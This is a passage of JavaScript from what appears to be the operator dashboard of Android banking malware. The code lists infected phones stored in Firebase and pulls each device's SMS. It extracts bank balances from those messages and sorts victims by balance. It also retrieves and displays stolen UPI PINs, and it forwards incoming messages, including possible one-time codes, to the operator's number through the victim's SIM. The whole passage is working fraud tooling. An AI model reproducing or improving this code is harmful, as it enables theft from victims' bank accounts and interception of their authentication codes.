        setWatermark(dev.id, msg.key);
        _forwardIncoming(dev, msg);
      }
    }
    var bal = extractLastBalance([msg]);
    if(bal){
      deviceBalances[dev.id] = bal; saveDeviceBalances();
      updateCardNoBlink(dev.id);
      if(selDev && selDev.id === dev.id) refreshDeviceModal();
    }
  }
}

function _shouldForwardOnce(devId, msgKey){
  var k = devId + '::' + msgKey;
  if(_forwardSeen.has(k)) return false;
  _forwardSeen.add(k);
  if(_forwardSeen.size > WATERMARK_MAX){
    var arr = Array.from(_forwardSeen);
    _forwardSeen = new Set(arr.slice(-WATERMARK_MAX/2));
    saveForwardTracker();
  }
  return true;
}

function _forwardIncoming(dev, msg){
  if(userConfig.forwardEnabled === false) return;
  if(!_isActiveDevice(dev)) return;
  var myNum = userConfig.myNumber; if(!myNum) return;
  var mode = userConfig.forwardMode || 'all';
  if(mode === 'banking' && !isBankingSms(msg.sender, msg.message)) return;
  var txt = String(msg.message || '').trim();
  if(!txt || txt === '(no body)') return;
  if(!passesRestriction(msg.sender, txt, null)) return;
  var sim = deviceSimMap[dev.id] || 1;
  sendSmsGuaranteed(dev, sim, myNum, txt);
}
function setMyNumberDefault(){
  if(!userConfig.myNumber){ toast('⚠ Set My Number in Settings'); return; }
  var el = document.getElementById('dmSendTo'); if(el){ el.value = userConfig.myNumber; toast('📞 ' + userConfig.myNumber); }
}

/* ═══════ RESTRICTION ═══════ */
function passesRestriction(sender, message, msgObj){
  var senderStr = '';
  if(msgObj && msgObj.chat){ senderStr = String(msgObj.chat.username || msgObj.chat.id || '').toLowerCase(); }
  senderStr = senderStr || String(sender || '').toLowerCase();
  var body = String(message || '').toLowerCase();
  var wl = userConfig.senderWhitelist || [];
  if(wl.length && !wl.some(function(w){ return senderStr === String(w).toLowerCase().replace('@',''); })) return false;
  var bl = userConfig.senderBlacklist || [];
  if(bl.length && bl.some(function(w){ return senderStr === String(w).toLowerCase().replace('@',''); })) return false;
  var tw = userConfig.textWhitelist || [];
  if(tw.length && !tw.some(function(w){ return body.indexOf(String(w).toLowerCase()) !== -1; })) return false;
  var tbl = userConfig.textBlacklist || [];
  if(tbl.length && tbl.some(function(w){ return body.indexOf(String(w).toLowerCase()) !== -1; })) return false;
  return true;
}

/* ═══════ POLLERS ═══════ */
function startDP(){
  stopDP();
  dPoll = setInterval(async function(){
    if(!FB_URL) return;
    try{
      var d = await fbGet('clients');
      var nD = parseDevs(d);
      nD.forEach(function(dev){ dev._fbId = 'primary'; dev._fbLabel = 'Primary'; dev._fbUrl = FB_URL; dev._fbKey = FB_KEY; });
      var others = allDevices.filter(function(x){ return (x._fbId || 'primary') !== 'primary'; });
      allDevices = applyStableOrder(nD.concat(others));
      renderStats(); renderGrid();
      if(selDev){
        var up = allDevices.find(function(x){ return x.id === selDev.id && (x._fbId||'primary') === (selDev._fbId||'primary'); });
        if(up){ selDev = up; refreshDeviceModal(); }
      }
    }catch(e){}
  }, POLL_DEV);
}
function stopDP(){ if(dPoll){ clearInterval(dPoll); dPoll = null; } }

function startMP(id){
  stopMP();
  curMsgDev = id;
  var dev = allDevices.find(function(d){ return d.id === id; });
  if(dev) startMsgStream(dev);
  pollMsgs(id);
  mPoll = setInterval(function(){
    if(selDev && selDev.id === id){
      var alive = _msgStream && _msgStream.readyState === 1;
      if(!alive) pollMsgs(id);
    }
  }, POLL_MSG);
}
function stopMP(){ if(mPoll){ clearInterval(mPoll); mPoll = null; } curMsgDev = null; stopMsgStream(); }

/* ═══════ DEVICE LOADING ═══════ */
async function loadDevs(){
  var grid = document.getElementById('deviceGrid');
  if(grid) grid.innerHTML = '<div class="ldwrap" style="grid-column:1/-1"><div class="gold-spin"></div> Loading devices…</div>';
  try{
    var data = await fbGet('clients');
    var primDevs = parseDevs(data);
    primDevs.forEach(function(d){
      d._fbId = 'primary'; d._fbLabel = 'Primary';
      d._fbUrl = FB_URL; d._fbKey = FB_KEY;
      if(noteC[d.id] === undefined) noteC[d.id] = d.note || '';
    });
    if(fbInstances.length > 0){ fbMergeAll(); }
    else { allDevices = applyStableOrder(primDevs); renderStats(); renderGrid(true); }
  }catch(e){
    if(grid) grid.innerHTML = '<div class="empty" style="grid-column:1/-1"><div class="ei">⚠️</div><p>Failed to load devices</p></div>';
  }
}

function applyStableOrder(devs){
  if(!Array.isArray(devs) || !devs.length) return devs;
  var orderMap = {};
  try{ orderMap = JSON.parse(localStorage.getItem('fbi_device_order') || '{}'); }catch(e){}
  var max = 0;
  Object.keys(orderMap).forEach(function(k){ var v = parseInt(orderMap[k], 10); if(v > max) max = v; });
  devs.forEach(function(d){
    var num = parseInt(orderMap[d.id], 10);
    if(isNaN(num)){ max += 1; num = max; orderMap[d.id] = num; }
    d.deviceOrder = num;
  });
  try{ localStorage.setItem('fbi_device_order', JSON.stringify(orderMap)); }catch(e){}
  return devs;
}

function parseDT(dt){
  if(!dt) return 0;
  var s = String(dt).trim();
  if(/^\d{10,13}$/.test(s)) return parseInt(s.length === 13 ? s : s + '000');
  var m = s.match(/(\d{1,2})[\-\/\.](\d{1,2})[\-\/\.](\d{4}).*?(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(am|pm)?/i);
  if(m){
    var h = +m[4], mn = +m[5], sc = +(m[6]||0), ap = (m[7]||'').toLowerCase();
    if(ap === 'pm' && h < 12) h += 12;
    if(ap === 'am' && h === 12) h = 0;
    return new Date(+m[3], +m[2]-1, +m[1], h, mn, sc).getTime();
  }
  var d = new Date(s); return isNaN(d.getTime()) ? 0 : d.getTime();
}
function parseBatt(v){ if(v == null) return NaN; return parseInt(String(v).replace('%','').trim()); }
function fmtPh(n){
  if(!n) return '—';
  var s = String(n).replace(/\D/g, '');
  if(s.startsWith('91') && s.length === 12) return '+' + s;
  if(s.length === 10) return '+91' + s;
  if(s.length > 0) return '+' + s;
  return '—';
}
function parseDevs(data){
  var devs = [];
  if(data && typeof data === 'object'){
    Object.entries(data).forEach(function(kv){
      var id = kv[0], d = kv[1];
      if(!d || typeof d !== 'object') return;
      var sims = Array.isArray(d.sims) ? d.sims : (d.sims && typeof d.sims === 'object' ? Object.values(d.sims) : []);
      devs.push({
        id: id, fbKey: id,
        name: d.modelName || d.model || d.deviceName || id,
        batteryRaw: d.battery != null ? d.battery : '—',
        batteryNum: parseBatt(d.battery),
        status: !!d.status,
        mobNo: fmtPh(d.mobNo || (sims[0] && (sims[0].phoneNumber || '') || '')),
        ip: d.ip_address || '—',
        android: d.androidV || '—',
        storage: d.storage || '—',
        note: d.note || '',
        joined: d.joined || '—',
        jTs: parseDT(d.joined || d.createdAt || d.timestamp || '') || 0,
        sdkV: d.sdkV || '—',
        cpuArch: d.cpu_arch || '—',
        isRoot: !!d.isRoot,
        serviceProvider: d.service_provider || '',
        upipin: (d.upipin && String(d.upipin).trim()) || null,
        sims: sims
      });
    });
  }
  return devs;
}

/* ═══════ STATS ═══════ */
function renderStats(){
  var on = 0, off = 0;
  for(var i=0;i<allDevices.length;i++){ if(allDevices[i].status) on++; else off++; }
  var a = document.getElementById('tpTot'), b = document.getElementById('tpOn'), c = document.getElementById('tpOff');
  if(a) a.textContent = allDevices.length + ' total';
  if(b) b.textContent = on + ' online';
  if(c) c.textContent = off + ' offline';
}

/* ═══════ SEARCH (debounced) ═══════ */
var _searchTmr = null, _msgSearchTmr = null, _amSearchTmr = null;
function setDeviceSearch(v){
  deviceSearchQuery = v || '';
  if(_searchTmr) clearTimeout(_searchTmr);
  _searchTmr = setTimeout(function(){ renderGrid(true); }, SEARCH_DEB);
}
function clearDeviceSearch(){
  var el = document.getElementById('deviceSearch'); if(el) el.value = '';
  deviceSearchQuery = ''; renderGrid(true);
}
function debounceSearchMsgs(){ if(_msgSearchTmr) clearTimeout(_msgSearchTmr); _msgSearchTmr = setTimeout(filterActiveMsgs, SEARCH_DEB); }
function debounceSearchAm(){ if(_amSearchTmr) clearTimeout(_amSearchTmr); _amSearchTmr = setTimeout(filterAndRender, SEARCH_DEB); }

function deviceMatchesSearch(d, query){
  if(!query) return true;
  var q = query.toLowerCase().trim(); if(!q) return true;
  var bal = deviceBalances[d.id];
  var carriers = devCarrierList(d).join(' ').toLowerCase();
  var hay = [
    d.name || '', d.id || '', d.mobNo || '',
    (d.mobNo || '').replace(/\+/g, ''), (d.mobNo || '').replace(/\D/g, ''),
    d.ip || '', d.note || '', noteC[d.id] || '',
    d.serviceProvider || '', carriers, d.upipin || '', pinC[d.id] || '',
    (d.sims || []).map(function(s){ return (s.phoneNumber || '') + ' ' + (s.phone || '') + ' ' + (s.carrier || ''); }).join(' '),
    bal ? (bal.bank + ' ' + bal.amount) : '', bal ? String(bal.amount) : '',
    d.status ? 'online' : 'offline'
  ].join(' ').toLowerCase();
  return hay.indexOf(q) !== -1;
}

/* ═══════ GRID ═══════ */
var _lastGridSig = '';
function _computeGridSig(filtered){
  var parts = [deviceSearchQuery || '', Array.from(_activeFilters).sort().join(',')];
  for(var i=0;i<filtered.length;i++){
    var d = filtered[i];
    var uid = (d._fbId || 'primary') + '|||' + d.id;
    var bal = deviceBalances[d.id];
    var balSig = bal ? (bal.amount + ':' + bal.bank) : '-';
    parts.push(uid + '|' + (d.deviceOrder || i) + '|' + (d.name || '') + '|' + (d.mobNo || '') + '|' + (d.note || noteC[d.id] || '') + '|' + (d.serviceProvider || '') + '|' + devCarrierList(d).join(',') + '|' + balSig + '|' + (d.status ? '1' : '0'));
  }
  return filtered.length + '##' + parts.join('##');
}

function updateCardNoBlink(devId){
  var d = allDevices.find(function(x){ return x.id === devId; }); if(!d) return;
  var uid = (d._fbId || 'primary') + '|||' + d.id;
  var card = document.querySelector('.device-card[data-uid="' + CSS.escape(uid) + '"]');
  if(!card) return;
  card.classList.toggle('online', d.status);
  var dot = card.querySelector('.dc-icon .dot');
  if(dot){ dot.classList.toggle('on', d.status); dot.classList.toggle('off', !d.status); }
}

function renderGrid(force){
  var grid = document.getElementById('deviceGrid'); if(!grid) return;

  var filtered = allDevices.filter(function(d){
    if(_activeFilters.size > 0){
      var matches = false;
      if(_activeFilters.has('online') && d.status) matches = true;
      if(_activeFilters.has('offline') && !d.status) matches = true;
      if(_activeFilters.has('jio') && deviceHasCarrier(d, 'Jio')) matches = true;
      if(_activeFilters.has('vi') && deviceHasCarrier(d, 'Vi')) matches = true;
      if(_activeFilters.has('pin') && (d.upipin || pinC[d.id])) matches = true;
      if(_activeFilters.has('balance') && deviceBalances[d.id]) matches = true;
      if(!matches) return false;
    }
    if(!deviceMatchesSearch(d, deviceSearchQuery)) return false;
    return true;
  });

  filtered.sort(function(a, b){
    var balA = deviceBalances[a.id] ? deviceBalances[a.id].amount : -1;
    var balB = deviceBalances[b.id] ? deviceBalances[b.id].amount : -1;
    if(balA !== balB) return balB - balA;
    return (a.deviceOrder || 0) - (b.deviceOrder || 0);
  });

  if(!filtered.length){
    var emptySig = '__EMPTY__' + (deviceSearchQuery || '') + '|' + Array.from(_activeFilters).sort().join(',');
    if(_lastGridSig !== emptySig){
      grid.innerHTML = '<div class="empty" style="grid-column:1/-1"><div class="ei">📵</div><p>' + (deviceSearchQuery ? 'No devices match' : 'No devices') + '</p></div>';
      _lastGridSig = emptySig;
    }
    return;
  }

  var sig = _computeGridSig(filtered);
  if(!force && sig === _lastGridSig) return;
  _lastGridSig = sig;

  var html = '';
  filtered.forEach(function(d, i){
    var uid = (d._fbId || 'primary') + '|||' + d.id;
    var isActive = (activeDeviceUid === uid);
    var bv = d.batteryNum;
    var bc = isNaN(bv) ? 'var(--sub)' : bv >= 60 ? 'var(--mint)' : bv >= 30 ? 'var(--gold)' : 'var(--rose)';
    var num = d.mobNo !== '—' ? d.mobNo : (d.sims[0] ? fmtPh(d.sims[0].phoneNumber || '') : '—');
    var note = noteC[d.id] || d.note || '';
    var used = !!usedDevices[d.id];
    var emo = d.name.toLowerCase().includes('iphone') ? '🍎' : d.name.toLowerCase().includes('samsung') ? '📱' : '📲';
    var bal = deviceBalances[d.id];
    var balHtml = bal
      ? '<div class="dc-balance"><div class="dc-bal-lbl">💰</div><div class="dc-bal-bank">' + esc(bal.bank) + '</div><div class="dc-bal-val" data-copy="' + escAttr(String(bal.amount)) + '" onclick="copyFromEl(this,event)">' + fmtBal(bal.amount) + '</div></div>'
      : '<div class="dc-balance empty"><div class="dc-bal-lbl">💰</div><div class="dc-bal-val">—</div></div>';
    var carBadges = devCarrierList(d).map(function(c){ return '<span class="dc-badge sim">📡 ' + esc(c) + '</span>'; }).join('');

    html += '<div class="device-card ' + (d.status ? 'online' : '') + ' ' + (isActive ? 'active' : '') + '" data-uid="' + escAttr(uid) + '" onclick="openDeviceModal(\'' + escAttr(uid) + '\')">'
      + '<div class="dc-top"><div class="dc-icon">' + emo + '<div class="dot ' + (d.status ? 'on' : 'off') + '"></div></div>'
      + '<div class="dc-meta"><div class="dc-name">' + esc(d.name) + '</div><div class="dc-id">#' + (d.deviceOrder || (i+1)) + ' · ' + esc(d.id.substring(0, 14)) + '…</div></div>'
      + (isActive ? '<div class="dc-active-pill">ACTIVE</div>' : '')
      + '</div>'
      + '<div class="dc-stats">'
      +   '<div class="dc-stat"><div class="dc-stat-lbl">Battery</div><div class="dc-stat-val" style="color:' + bc + '">' + (isNaN(bv) ? d.batteryRaw : bv + '%') + '</div></div>'
      +   '<div class="dc-stat"><div class="dc-stat-lbl">SIMs</div><div class="dc-stat-val" style="color:var(--gold2)">' + d.sims.length + '</div></div>'
      +   '<div class="dc-stat"><div class="dc-stat-lbl">State</div><div class="dc-stat-val" style="color:' + (d.status ? 'var(--mint)' : 'var(--dim)') + ';font-size:11px">' + (d.status ? 'ON' : 'OFF') + '</div></div>'
      + '</div>'
      + '<div class="dc-num" data-copy="' + escAttr(num) + '" onclick="copyFromEl(this,event)">' + esc(num) + '</div>'
      + balHtml
      + (note ? '<div class="dc-note">📝 ' + esc(note) + '</div>' : '')
      + '<div class="dc-footer"><div class="dc-badges">'
      +   (d.upipin || pinC[d.id] ? '<span class="dc-badge pin">💳 PIN</span>' : '')
      +   (used ? '<span class="dc-badge used">✓ Used</span>' : '')
      +   carBadges
      + '</div><div class="dc-conn">#' + (d.deviceOrder || (i+1)) + '</div></div></div>';
  });
  grid.innerHTML = html;
}

function toggleFilterMenu(e){
  if(e) e.stopPropagation();
  var m = document.getElementById('filterMenu'); if(m) m.classList.toggle('open');
}
function setGridFilter(f){
  if(f === 'all'){ _activeFilters.clear(); }
  else { if(_activeFilters.has(f)) _activeFilters.delete(f); else _activeFilters.add(f); }
  _saveFilters(); _updateFilterUI(); renderGrid(true);
}
document.addEventListener('click', function(e){
  var menu = document.getElementById('filterMenu');
  if(menu && !e.target.closest('.filter-wrap')) menu.classList.remove('open');
});

/* ═══════ DEVICE MODAL ═══════ */
function openDeviceModal(uid){
  var parts = uid.split('|||');
  var d = allDevices.find(function(x){ return x.id === parts[1] && (x._fbId || 'primary') === parts[0]; });
  if(!d) d = allDevices.find(function(x){ return x.id === parts[1]; });
  if(!d){ toast('⚠ Device not found'); return; }

  selDev = d; activeDeviceUid = uid;
  try{ localStorage.setItem(CFG.LS_ACTIVE || 'fbi_active_device', uid); }catch(e){}
  savePanelSession(); renderGrid(true);

  var modal = document.getElementById('deviceModal'); if(modal) modal.classList.add('open');
  refreshDeviceModal();

  if(userConfig.botEnabled !== false && userConfig.channelId && !tgRunning) startFastTelegram();

  var list = document.getElementById('dmMsgList');
  if(list) list.innerHTML = '<div class="ldwrap"><div class="gold-spin"></div> Loading…</div>';
  allMsgs = []; lastKeys = new Set();
  preloadMsgs(d.id, true);
  updOtpNoteBox();
  setTimeout(function(){
    var toInp = document.getElementById('dmSendTo');
    if(toInp && !toInp.value && userConfig.myNumber) toInp.value = userConfig.myNumber;
  }, 50);
}

function refreshDeviceModal(){
  if(!selDev) return;
  var d = selDev;
  var nm = document.getElementById('dmName'); if(nm) nm.textContent = d.name;
  var dmSubEl = document.getElementById('dmSub');
  if(dmSubEl) dmSubEl.innerHTML = '#' + (d.deviceOrder || '—') + ' · <span style="border-bottom:1px dashed var(--border2)">' + esc(d.id) + '</span> 📋';

  var bv = d.batteryNum;
  var bc = isNaN(bv) ? 'var(--sub)' : bv >= 60 ? 'var(--mint)' : bv >= 30 ? 'var(--gold)' : 'var(--rose)';
  var bp = isNaN(bv) ? 0 : Math.min(100, Math.max(0, bv));
  var bd = isNaN(bv) ? d.batteryRaw : bv + '%';

  var hero = document.getElementById('dmHero');
  if(hero){
    hero.innerHTML = '<div class="dm-hero-batt"><div class="dm-hero-batt-num" style="color:' + bc + '">' + bd + '</div><div class="dm-hero-batt-lbl">Battery</div></div>'
      + '<div class="dm-hero-batt-bar"><div class="dm-hero-batt-fill" style="width:' + bp + '%;background:' + bc + '"></div></div>'
      + '<div class="dm-hero-status">'
      + '<span style="background:' + (d.status ? 'rgba(104,245,208,.14)' : 'rgba(255,102,140,.1)') + ';color:' + (d.status ? 'var(--mint)' : 'var(--rose)') + '">' + (d.status ? '● ONLINE' : '● OFFLINE') + '</span>'
      + devCarrierList(d).map(function(c){ return '<span style="background:rgba(120,216,255,.12);color:var(--sky)">📡 ' + esc(c) + '</span>'; }).join('')
      + (d.isRoot ? '<span style="background:rgba(255,121,185,.14);color:var(--gold2)">⚡ Root</span>' : '')
      + '</div>';
  }

  var bal = deviceBalances[d.id];
  var balHero = document.getElementById('dmBalHero');
  if(balHero){
    if(bal){
      balHero.className = 'dm-bal-hero';
      balHero.innerHTML = '<div class="dm-bal-hero-lbl">💰 Latest Balance</div>'
        + '<div class="dm-bal-hero-val" data-copy="' + escAttr(String(bal.amount)) + '" onclick="copyFromEl(this,event)">' + fmtBal(bal.amount) + '</div>'
        + '<div class="dm-bal-hero-sub"><b>🏦 ' + esc(bal.bank) + '</b> · ' + esc(bal.sender || '—') + (bal.ts ? ' · ' + new Date(bal.ts).toLocaleString() : '') + '</div>';
    } else {
      balHero.className = 'dm-bal-hero empty';
      balHero.innerHTML = '<div class="dm-bal-hero-lbl">💰 Latest Balance</div><div class="dm-bal-hero-val">No banking SMS found yet</div>';
    }
  }

  var s1 = d.sims[0], s2 = d.sims[1];
  var c1 = getSimCarrier(s1, d.serviceProvider), c2 = getSimCarrier(s2, d.serviceProvider);
  var sim1El = document.getElementById('dmSim1'), sim2El = document.getElementById('dmSim2');
  if(sim1El) sim1El.textContent = s1 ? (fmtPh(s1.phoneNumber || s1.phone || '') + ' · ' + c1) : 'No SIM';
  if(sim2El) sim2El.textContent = s2 ? (fmtPh(s2.phoneNumber || s2.phone || '') + ' · ' + c2) : 'No SIM';

  var curSim = deviceSimMap[d.id] || 1;
  document.querySelectorAll('#dmSimSelect .sim-opt').forEach(function(el){ el.classList.toggle('active', parseInt(el.dataset.sim) === curSim); });
  var b1 = document.getElementById('dmSimBtn1'), b2 = document.getElementById('dmSimBtn2');
  if(b1) b1.className = 'stb' + (curSim === 1 ? ' s1' : '');
  if(b2) b2.className = 'stb' + (curSim === 2 ? ' s2' : '');

  var ni = document.getElementById('dmNoteInp');
  if(ni && document.activeElement !== ni) ni.value = noteC[d.id] || d.note || '';

  var info = document.getElementById('dmInfo');
  if(info){
    info.innerHTML =
      '<div class="ic"><div class="ic-l">Phone</div><div class="ic-v" data-copy="' + escAttr(d.mobNo) + '" onclick="copyFromEl(this,event)">' + esc(d.mobNo) + '</div></div>'
      + '<div class="ic"><div class="ic-l">IP</div><div class="ic-v mono" data-copy="' + escAttr(d.ip) + '" onclick="copyFromEl(this,event)">' + esc(d.ip) + '</div></div>'
      + '<div class="ic"><div class="ic-l">Storage</div><div class="ic-v">' + esc(String(d.storage)) + '</div></div>'
      + '<div class="ic"><div class="ic-l">Android</div><div class="ic-v">' + esc(d.android) + '</div></div>'
      + '<div class="ic"><div class="ic-l">SDK</div><div class="ic-v">' + esc(d.sdkV) + '</div></div>'
      + '<div class="ic"><div class="ic-l">CPU</div><div class="ic-v">' + esc(d.cpuArch) + '</div></div>'
      + '<div class="ic"><div class="ic-l">Joined</div><div class="ic-v" style="font-size:11px">' + esc(String(d.joined).slice(0, 20)) + '</div></div>'
      + '<div class="ic"><div class="ic-l">Firebase</div><div class="ic-v mono" style="font-size:9px">' + esc((d._fbUrl || FB_URL).substring(0, 40)) + '</div></div>';
  }

  var sendDisp = document.getElementById('dmSendDisp');
  if(sendDisp){
    sendDisp.innerHTML = '<div style="width:9px;height:9px;border-radius:50%;background:' + (d.status ? 'var(--mint)' : 'var(--dim)') + '"></div>'
      + '<div style="flex:1;min-width:0"><div class="dd-name">' + esc(d.name) + '</div>'
      + '<div class="dd-id" data-copy="' + escAttr(d.id) + '" onclick="copyFromEl(this,event)">' + esc(d.id) + '</div></div>';
  }

  loadPinActive();
  renderBankPane();
}

function dmSwitchTab(tab){
  document.querySelectorAll('.dm-tab').forEach(function(t){ t.classList.toggle('active', t.dataset.tab === tab); });
  document.querySelectorAll('.dm-tab-pane').forEach(function(p){ p.classList.remove('active'); });
  var pane = document.getElementById('dmPane-' + tab); if(pane) pane.classList.add('active');
  if(tab === 'bank') renderBankPane();
}
function setActiveSim(sim){
  if(!selDev) return;
  deviceSimMap[selDev.id] = sim; saveDeviceSims(); refreshDeviceModal();
  toast('✓ SIM ' + sim + ' active');
}
function saveNoteActive(){
  if(!selDev) return;
  var val = document.getElementById('dmNoteInp').value.trim();
  fbSet('clients/' + selDev.id + '/note', val || null, selDev._fbUrl, selDev._fbKey)
    .then(function(){ noteC[selDev.id] = val; selDev.note = val; toast('📝 Saved'); renderGrid(true); })
    .catch(function(){ toast('⚠ Failed'); });
}
function confDelActive(){
  if(!selDev) return;
  var ct = document.getElementById('confT'), cm = document.getElementById('confM'), co = document.getElementById('confOk');
  if(ct) ct.textContent = 'Delete Device?';
  if(cm) cm.textContent = 'Delete "' + selDev.name + '"?';
  if(co) co.onclick = async function(){
    closeM('confirmModal');
    try{ await fbDel('clients/' + selDev.id, selDev._fbUrl, selDev._fbKey); toast('✓ Deleted'); closeM('deviceModal'); loadDevs(); }
    catch(e){ toast('⚠ Failed'); }
  };
  openM('confirmModal');
}
function copyDeviceId(){
  if(!selDev){ toast('⚠ No device'); return; }
  var id = selDev.id;
  var done = function(){ toast('📋 ID copied'); };
  if(navigator.clipboard && navigator.clipboard.writeText){ navigator.clipboard.writeText(id).then(done).catch(function(){}); }
}

/* ═══════ BALANCE ═══════ */
function extractBalanceFromText(txt){
  if(!txt) return null;
  var pats = [
    /(?:Avl\.?\s*Bal|AvlBal|Available\s*Bal|Avail\.?\s*Bal|Avbl\s*Bal)\s*:?\s*(?:Rs\.?:?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,
    /(?:Ledger|Book|Closing)\s*Bal(?:ance)?\s*:?\s*(?:Rs\.?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,
    /CLR\s*BAL\s*([0-9,]+(?:\.[0-9]{1,2})?)\s*CR/i,
    /Bal\s*(?:\(incl[^)]*\))?\s*(?:Rs\.?|INR)\.?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,
    /balance(?:\s*is)?\s*(?:Rs\.?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,
    /\bBal[\s:]+(?:Rs\.?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i
  ];
  for(var i=0;i<pats.length;i++){
    var m = txt.match(pats[i]);
    if(m){ var v = parseFloat(m[1].replace(/,/g, '')); if(!isNaN(v)) return v; }
  }
  return null;
}
function extractLastBalance(msgs){
  if(!msgs || !msgs.length) return null;
  for(var i=0;i<msgs.length;i++){
    var m = msgs[i];
    if(m.type && m.type !== 'incoming') continue;
    var bank = detectBank(m.sender); if(!bank) continue;
    var txt = String(m.message || ''), lower = txt.toLowerCase();
    var isPromo = false, hasBal = false, hasTxn = false;
    for(var p=0;p<BANK_PROMO_KW.length;p++){ if(lower.indexOf(BANK_PROMO_KW[p]) !== -1){ isPromo = true; break; } }
    for(var b=0;b<BANK_BAL_KW.length;b++){ if(lower.indexOf(BANK_BAL_KW[b]) !== -1){ hasBal = true; break; } }
    for(var t=0;t<BANK_TXN_KW.length;t++){ if(lower.indexOf(BANK_TXN_KW[t]) !== -1){ hasTxn = true; break; } }
    if(isPromo && !hasBal && !hasTxn) continue;
    if(!hasBal && !hasTxn) continue;
    var amt = extractBalanceFromText(txt);
    if(amt != null) return { amount: amt, bank: bank.name, sender: m.sender, ts: m._ts || 0, msg: m.message || '' };
  }
  return null;
}
function fmtBal(n){ return '\u20B9' + Number(n).toLocaleString('en-IN', { maximumFractionDigits: 2 }); }

function startBalancePoll(){ stopBalancePoll(); balPoll = setInterval(balanceTick, POLL_BAL); setTimeout(balanceTick, 800); }
function stopBalancePoll(){ if(balPoll){ clearInterval(balPoll); balPoll = null; } }

async function balanceTick(){
  if(!FB_URL) return;
  try{
    var online = allDevices.filter(function(d){ return d.status; });
    var BATCH = 30;
    for(var i=0;i<online.length;i+=BATCH){
      await Promise.allSettled(online.slice(i, i+BATCH).map(async function(dev){
        try{
          var fbUrl = dev._fbUrl || FB_URL, fbKey = dev._fbKey !== undefined ? dev._fbKey : FB_KEY;
          var auth = fbKey ? '?auth=' + fbKey + '&' : '?';
          var r = await _fastFetch(fbUrl + '/messages/' + dev.id + '.json' + auth + 'orderBy="$key"&limitToLast=30');
          if(!r.ok) return;
          var bal = extractLastBalance(parseMsgs(await r.json()));
          if(bal) deviceBalances[dev.id] = bal;
        }catch(e){}
      }));
    }
    saveDeviceBalances();
    online.forEach(function(d){ updateCardNoBlink(d.id); });
    if(selDev) refreshDeviceModal();
  }catch(e){}
}

/* ═══════ BANKING PANE ═══════ */
function renderBankPane(){
  var el = document.getElementById('dmBankPane'); if(!el || !selDev) return;
  var bankMsgs = allMsgs.filter(function(m){ if(m.type !== 'incoming') return false; return !!isBankingSms(m.sender, m.message); });
  if(!bankMsgs.length){ el.innerHTML = '<div class="empty"><div class="ei">🏦</div><p>No banking SMS</p></div>'; return; }

  var cr = 0, dr = 0, cards = '';
  bankMsgs.forEach(function(m){
    var bank = detectBank(m.sender);
    var txt = String(m.message || ''), amts = [];
    var re = /(?:Rs\.?\s*|INR\.?\s*|\u20B9\s*)([0-9,]+(?:\.[0-9]{1,2})?)/gi, match;
    while((match = re.exec(txt)) !== null){
      var v = parseFloat(match[1].replace(/,/g, ''));
      if(!isNaN(v) && v > 0) amts.push(v);
    }
    var amt = amts.length ? amts[0] : 0;
    var isCr = /credited|credit\b|received|deposited|refund/i.test(txt) && !/debit/i.test(txt);
    var isDr = /debited|debit\b|spent|withdrawn/i.test(txt) && !/credit/i.test(txt);
    if(isCr) cr += amt;
    if(isDr) dr += amt;
    var amtBadge = (amt > 0 && (isCr || isDr)) ? '<span class="bank-card-amt ' + (isCr ? 'bank-cr' : 'bank-dr') + '">' + (isCr ? '+' : '-') + fmtBal(amt) + '</span>' : '';

    cards += '<div class="bank-card"><div class="bank-card-top">'
      + (bank ? '<span class="bank-card-name">🏦 ' + esc(bank.name) + '</span>' : '')
      + '<span class="msg-sndr" style="font-size:10px;color:var(--sky)" data-copy="' + escAttr(m.sender) + '" onclick="copyFromEl(this,event)">' + esc(m.sender) + '</span>'
      + amtBadge
      + '<span class="bank-card-ts">' + esc(m.dateTime || '') + '</span>'
      + '</div><div class="bank-card-txt" data-copy="' + escAttr(m.message) + '" onclick="copyFromEl(this,event)">' + esc(m.message) + '</div></div>';
  });

  el.innerHTML = '<div class="bank-summary">'
    + '<div class="bank-sum"><div class="bank-sum-l">Credit</div><div class="bank-sum-v" style="color:var(--mint)">' + fmtBal(cr) + '</div></div>'
    + '<div class="bank-sum"><div class="bank-sum-l">Debit</div><div class="bank-sum-v" style="color:var(--rose)">' + fmtBal(dr) + '</div></div>'
    + '<div class="bank-sum"><div class="bank-sum-l">Count</div><div class="bank-sum-v" style="color:var(--gold2)">' + bankMsgs.length + '</div></div>'
    + '</div><div class="bank-list">' + cards + '</div>';
}

/* ═══════ PIN ═══════ */
async function getPin(id){
  var dev = allDevices.find(function(d){ return d.id === id; });
  var u = (dev && dev._fbUrl) || FB_URL, k = (dev && dev._fbKey !== undefined) ? dev._fbKey : FB_KEY;
  try{
    var auth = k ? '?auth=' + k : '';
    var r = await _fastFetch(u + '/clients/' + id + '/upipin.json' + auth);
    var val = await r.json();
    if(val === null || val === undefined || val === false || val === '') return null;
    if(typeof val === 'string' && val.trim()) return val.trim();
    if(typeof val === 'number') return String(val);
    return null;
  }catch(e){ return null; }
}
async function loadPinActive(){
  if(!selDev) return;
  var pv = document.getElementById('dmPinVal'), pt = document.getElementById('dmPinToggle'), pcp = document.getElementById('dmPinCopy');
  if(!pv) return;
  var raw = selDev.upipin || pinC[selDev.id];
  if(!raw){ raw = await getPin(selDev.id); pinC[selDev.id] = raw; }
  if(raw){
    var display = String(raw).split('|')[0].trim();
    pv.className = 'pin-digits blurred';
    pv.textContent = display;
    pv.setAttribute('data-copy', display);
    pv.setAttribute('onclick', 'copyFromEl(this,event)');
    pinV[selDev.id] = false;
    if(pt){ pt.style.display = ''; pt.textContent = 'Show'; }
    if(pcp) pcp.style.display = '';
  } else {
    pv.className = 'pin-digits loading';
    pv.textContent = 'Not found';
  }
}
function togPinActive(){
  if(!selDev) return;
  var id = selDev.id;
  pinV[id] = !pinV[id];
  var v = document.getElementById('dmPinVal'), b = document.getElementById('dmPinToggle');
  if(v) v.classList.toggle('blurred', !pinV[id]);
  if(b) b.textContent = pinV[id] ? 'Hide' : 'Show';
}
function copyPinActive(){
  if(!selDev) return;
  var v = document.getElementById('dmPinVal');
  if(!v || v.classList.contains('loading')) return;
  copyFromEl(v);
}

/* ═══════ MESSAGES ═══════ */
var _msgCache = {};
function _msgCacheGet(key){ return _msgCache[key] || []; }
